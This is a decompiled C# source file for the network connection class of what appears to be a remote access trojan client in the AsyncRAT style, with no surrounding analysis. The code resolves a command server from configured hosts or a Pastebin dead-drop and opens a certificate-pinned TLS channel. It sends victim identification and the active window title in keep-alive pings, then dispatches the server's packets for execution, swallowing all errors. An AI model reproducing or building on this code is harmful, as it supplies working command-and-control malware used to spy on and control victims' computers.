using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Client.Handle_Packet;
using Client.Helper;
using MessagePackLib.MessagePack;

namespace Client.Connection
{
	// Token: 0x02000004 RID: 4
	public static class ClientSocket
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000006 RID: 6 RVA: 0x00002080 File Offset: 0x00000280
		// (set) Token: 0x06000007 RID: 7 RVA: 0x00002087 File Offset: 0x00000287
		public static Socket TcpClient { get; set; }

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000008 RID: 8 RVA: 0x0000208F File Offset: 0x0000028F
		// (set) Token: 0x06000009 RID: 9 RVA: 0x00002096 File Offset: 0x00000296
		public static SslStream SslClient { get; set; }

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x0600000A RID: 10 RVA: 0x0000209E File Offset: 0x0000029E
		// (set) Token: 0x0600000B RID: 11 RVA: 0x000020A5 File Offset: 0x000002A5
		private static byte[] Buffer { get; set; }

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x0600000C RID: 12 RVA: 0x000020AD File Offset: 0x000002AD
		// (set) Token: 0x0600000D RID: 13 RVA: 0x000020B4 File Offset: 0x000002B4
		private static long HeaderSize { get; set; }

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x0600000E RID: 14 RVA: 0x000020BC File Offset: 0x000002BC
		// (set) Token: 0x0600000F RID: 15 RVA: 0x000020C3 File Offset: 0x000002C3
		private static long Offset { get; set; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000010 RID: 16 RVA: 0x000020CB File Offset: 0x000002CB
		// (set) Token: 0x06000011 RID: 17 RVA: 0x000020D2 File Offset: 0x000002D2
		private static Timer KeepAlive { get; set; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000012 RID: 18 RVA: 0x000020DA File Offset: 0x000002DA
		// (set) Token: 0x06000013 RID: 19 RVA: 0x000020E1 File Offset: 0x000002E1
		public static bool IsConnected { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000014 RID: 20 RVA: 0x000020E9 File Offset: 0x000002E9
		private static object SendSync { get; } = new object();

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000015 RID: 21 RVA: 0x000020F0 File Offset: 0x000002F0
		// (set) Token: 0x06000016 RID: 22 RVA: 0x000020F7 File Offset: 0x000002F7
		private static Timer Ping { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000017 RID: 23 RVA: 0x000020FF File Offset: 0x000002FF
		// (set) Token: 0x06000018 RID: 24 RVA: 0x00002106 File Offset: 0x00000306
		public static int Interval { get; set; }

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06000019 RID: 25 RVA: 0x0000210E File Offset: 0x0000030E
		// (set) Token: 0x0600001A RID: 26 RVA: 0x00002115 File Offset: 0x00000315
		public static bool ActivatePong { get; set; }

		// Token: 0x0600001B RID: 27 RVA: 0x00002970 File Offset: 0x00000B70
		public static void InitializeClient()
		{
			try
			{
				ClientSocket.TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
				{
					ReceiveBufferSize = 51200,
					SendBufferSize = 51200
				};
				if (Settings.Pastebin == "null")
				{
					string text = Settings.Hosts.Split(new char[] { ',' })[new Random().Next(Settings.Hosts.Split(new char[] { ',' }).Length)];
					int num = Convert.ToInt32(Settings.Ports.Split(new char[] { ',' })[new Random().Next(Settings.Ports.Split(new char[] { ',' }).Length)]);
					if (ClientSocket.IsValidDomainName(text))
					{
						foreach (IPAddress ipaddress in Dns.GetHostAddresses(text))
						{
							try
							{
								ClientSocket.TcpClient.Connect(ipaddress, num);
								if (ClientSocket.TcpClient.Connected)
								{
									break;
								}
							}
							catch
							{
							}
						}
					}
					else
					{
						ClientSocket.TcpClient.Connect(text, num);
					}
				}
				else
				{
					using (WebClient webClient = new WebClient())
					{
						NetworkCredential networkCredential = new NetworkCredential("", "");
						webClient.Credentials = networkCredential;
						string[] array = webClient.DownloadString(Settings.Pastebin).Split(new string[] { ":" }, StringSplitOptions.None);
						Settings.Hosts = array[0];
						Settings.Ports = array[new Random().Next(1, array.Length)];
						ClientSocket.TcpClient.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
					}
				}
				if (ClientSocket.TcpClient.Connected)
				{
					ClientSocket.IsConnected = true;
					ClientSocket.SslClient = new SslStream(new NetworkStream(ClientSocket.TcpClient, true), false, new RemoteCertificateValidationCallback(ClientSocket.ValidateServerCertificate));
					ClientSocket.SslClient.AuthenticateAsClient(ClientSocket.TcpClient.RemoteEndPoint.ToString().Split(new char[] { ':' })[0], null, SslProtocols.Tls, false);
					ClientSocket.HeaderSize = 4L;
					ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
					ClientSocket.Offset = 0L;
					ClientSocket.Send(IdSender.SendInfo());
					ClientSocket.Interval = 0;
					ClientSocket.ActivatePong = false;
					ClientSocket.KeepAlive = new Timer(new TimerCallback(ClientSocket.KeepAlivePacket), null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
					ClientSocket.Ping = new Timer(new TimerCallback(ClientSocket.Pong), null, 1, 1);
					ClientSocket.SslClient.BeginRead(ClientSocket.Buffer, (int)ClientSocket.Offset, (int)ClientSocket.HeaderSize, new AsyncCallback(ClientSocket.ReadServertData), null);
				}
				else
				{
					ClientSocket.IsConnected = false;
				}
			}
			catch
			{
				ClientSocket.IsConnected = false;
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x0000211D File Offset: 0x0000031D
		private static bool IsValidDomainName(string name)
		{
			return Uri.CheckHostName(name) > UriHostNameType.Unknown;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002128 File Offset: 0x00000328
		private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
		{
			return Settings.ServerCertificate.Equals(certificate);
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002CBC File Offset: 0x00000EBC
		public static void Reconnect()
		{
			try
			{
				SslStream sslClient = ClientSocket.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = ClientSocket.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
				Timer ping = ClientSocket.Ping;
				if (ping != null)
				{
					ping.Dispose();
				}
				Timer keepAlive = ClientSocket.KeepAlive;
				if (keepAlive != null)
				{
					keepAlive.Dispose();
				}
			}
			catch
			{
			}
			ClientSocket.IsConnected = false;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002D44 File Offset: 0x00000F44
		public static void ReadServertData(IAsyncResult ar)
		{
			try
			{
				if (!ClientSocket.TcpClient.Connected || !ClientSocket.IsConnected)
				{
					ClientSocket.IsConnected = false;
				}
				else
				{
					int num = ClientSocket.SslClient.EndRead(ar);
					if (num > 0)
					{
						ClientSocket.Offset += (long)num;
						ClientSocket.HeaderSize -= (long)num;
						if (ClientSocket.HeaderSize == 0L)
						{
							ClientSocket.HeaderSize = (long)BitConverter.ToInt32(ClientSocket.Buffer, 0);
							if (ClientSocket.HeaderSize > 0L)
							{
								ClientSocket.Offset = 0L;
								ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
								while (ClientSocket.HeaderSize > 0L)
								{
									int num2 = ClientSocket.SslClient.Read(ClientSocket.Buffer, (int)ClientSocket.Offset, (int)ClientSocket.HeaderSize);
									if (num2 <= 0)
									{
										ClientSocket.IsConnected = false;
										return;
									}
									ClientSocket.Offset += (long)num2;
									ClientSocket.HeaderSize -= (long)num2;
									if (ClientSocket.HeaderSize < 0L)
									{
										ClientSocket.IsConnected = false;
										return;
									}
								}
								new Thread(new ParameterizedThreadStart(Packet.Read)).Start(ClientSocket.Buffer);
								ClientSocket.Offset = 0L;
								ClientSocket.HeaderSize = 4L;
								ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
							}
							else
							{
								ClientSocket.HeaderSize = 4L;
								ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
								ClientSocket.Offset = 0L;
							}
						}
						else if (ClientSocket.HeaderSize < 0L)
						{
							ClientSocket.IsConnected = false;
							return;
						}
						ClientSocket.SslClient.BeginRead(ClientSocket.Buffer, (int)ClientSocket.Offset, (int)ClientSocket.HeaderSize, new AsyncCallback(ClientSocket.ReadServertData), null);
					}
					else
					{
						ClientSocket.IsConnected = false;
					}
				}
			}
			catch
			{
				ClientSocket.IsConnected = false;
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00002F2C File Offset: 0x0000112C
		public static void Send(byte[] msg)
		{
			object sendSync = ClientSocket.SendSync;
			lock (sendSync)
			{
				try
				{
					if (ClientSocket.IsConnected)
					{
						byte[] bytes = BitConverter.GetBytes(msg.Length);
						ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite);
						ClientSocket.SslClient.Write(bytes, 0, bytes.Length);
						if (msg.Length > 1000000)
						{
							using (MemoryStream memoryStream = new MemoryStream(msg))
							{
								memoryStream.Position = 0L;
								byte[] array = new byte[50000];
								int num;
								while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
								{
									ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite);
									ClientSocket.SslClient.Write(array, 0, num);
									ClientSocket.SslClient.Flush();
								}
								goto IL_E8;
							}
						}
						ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite);
						ClientSocket.SslClient.Write(msg, 0, msg.Length);
						ClientSocket.SslClient.Flush();
						IL_E8:;
					}
				}
				catch
				{
					ClientSocket.IsConnected = false;
				}
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003068 File Offset: 0x00001268
		public static void KeepAlivePacket(object obj)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "Ping";
				msgPack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
				ClientSocket.Send(msgPack.Encode2Bytes());
				GC.Collect();
				ClientSocket.ActivatePong = true;
			}
			catch
			{
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x000030D4 File Offset: 0x000012D4
		private static void Pong(object obj)
		{
			try
			{
				if (ClientSocket.ActivatePong && ClientSocket.IsConnected)
				{
					ClientSocket.Interval++;
				}
			}
			catch
			{
			}
		}
	}
}
